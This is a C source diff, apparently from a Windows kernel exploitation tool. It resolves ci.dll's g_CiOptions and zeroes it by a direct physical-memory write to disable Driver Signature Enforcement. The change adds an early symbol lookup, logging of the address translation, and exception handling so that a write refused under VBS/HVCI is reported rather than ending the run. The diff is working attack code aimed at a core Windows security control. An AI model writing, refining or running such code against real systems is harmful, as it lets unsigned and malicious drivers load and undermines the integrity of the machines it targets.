@@ -216,7 +216,34 @@ static bool FindCiOptionsRva(ULONG64 cr3, ULONG64 ciBase, ULONG* outImageSize,
     return true;
 }
 
-bool DisableDSE(ULONG64 systemCr3, KernelOffsets* offsets) {
+// Remember the status of a trapped write so the caller can report it. The
+// filter runs for first chance too, so only the final refusal matters.
+static int DseWriteFilter(EXCEPTION_POINTERS* ep, ULONG_PTR code, ULONG* outCode) {
+    (void)ep;
+    if (outCode) *outCode = (ULONG)code;
+    return EXCEPTION_EXECUTE_HANDLER;
+}
+
+// Locate ci.dll!g_CiOptions before anything expensive happens.
+bool ResolveCiOptionsRva(ULONG64* outRva) {
+    printf("[*] Resolving ci.dll!g_CiOptions...\n");
+
+    ULONG64 rva = 0;
+    if (!ResolveSymbolRva("C:\\Windows\\System32\\ci.dll", "g_CiOptions", &rva) || !rva) {
+        // Not fatal: DisableDSE() can still find it structurally once the window
+        // is up. Doing that fallback here would need the window this early,
+        // which is the ordering problem being avoided.
+        printf("[-] g_CiOptions not resolved up front; DisableDSE will locate it structurally\n");
+        *outRva = 0;
+        return false;
+    }
+
+    printf("[+] g_CiOptions RVA: 0x%llX\n", rva);
+    *outRva = rva;
+    return true;
+}
+
+bool DisableDSE(ULONG64 systemCr3, KernelOffsets* offsets, bool haveRva, ULONG64 rva) {
     printf("\n[*] Disabling DSE (g_CiOptions)...\n");
 
     ULONG64 ciBase = 0;
@@ -227,9 +254,9 @@ bool DisableDSE(ULONG64 systemCr3, KernelOffsets* offsets) {
     }
     printf("[+] ci.dll: 0x%llX (%u KB)\n", ciBase, ciSize / 1024);
 
-    // Some builds expose the symbol directly; try that first.
-    ULONG64 rva = 0;
-    if (!ResolveSymbolRva("C:\\Windows\\System32\\ci.dll", "g_CiOptions", &rva)) {
+    // Resolved up front, while memory was plentiful; only the structural
+    // fallback needs the window and therefore runs here.
+    if (!haveRva || !rva) {
         if (!FindCiOptionsRva(systemCr3, ciBase, &ciSize, &rva)) {
             printf("[-] Could not locate g_CiOptions\n");
             return false;
@@ -242,6 +269,9 @@ bool DisableDSE(ULONG64 systemCr3, KernelOffsets* offsets) {
         printf("[-] Failed to translate g_CiOptions (VA 0x%llX)\n", ciBase + rva);
         return false;
     }
+    printf("[*] g_CiOptions VA 0x%llX -> PA 0x%llX%s%s\n", ciBase + rva, pa,
+           WindowContains(pa) ? "" : "  (OUTSIDE the window)",
+           pa < WindowResidentExtent() ? " (resident)" : " (not resident: the write will fault)");
 
     ULONG before = WindowRead32(pa);
     printf("[*] g_CiOptions = 0x%08X\n", before);
@@ -249,7 +279,28 @@ bool DisableDSE(ULONG64 systemCr3, KernelOffsets* offsets) {
         printf("[!] Already 0 - DSE was not enforcing, this step has nothing to do\n");
 
     ULONG zero = 0;
-    WindowWriteBuffer(pa, &zero, sizeof(zero));
+
+    // The write is the only thing here that can fault, and on a VBS/HVCI system
+    // that fault is not always serviceable - kernel data protection can refuse
+    // it. Report that instead of letting it end the run: everything else this
+    // tool does has already completed by now.
+    bool wrote = true;
+    ULONG writeCode = 0;
+    __try {
+        WindowWriteBuffer(pa, &zero, sizeof(zero));
+    }
+    __except (DseWriteFilter(GetExceptionInformation(), GetExceptionCode(), &writeCode)) {
+        wrote = false;
+    }
+
+    if (!wrote) {
+        printf("[-] The write to g_CiOptions was refused (0x%08lX); DSE left as it is\n",
+               (unsigned long)writeCode);
+        printf("[-] Under VBS/HVCI kernel data protection this is expected: the read succeeds\n"
+               "    but the store is blocked. Disabling DSE by physical write needs the\n"
+               "    hypervisor's cooperation, or a driver loaded with signing off.\n");
+        return false;
+    }
 
     ULONG after = WindowRead32(pa);
     if (after == 0) {
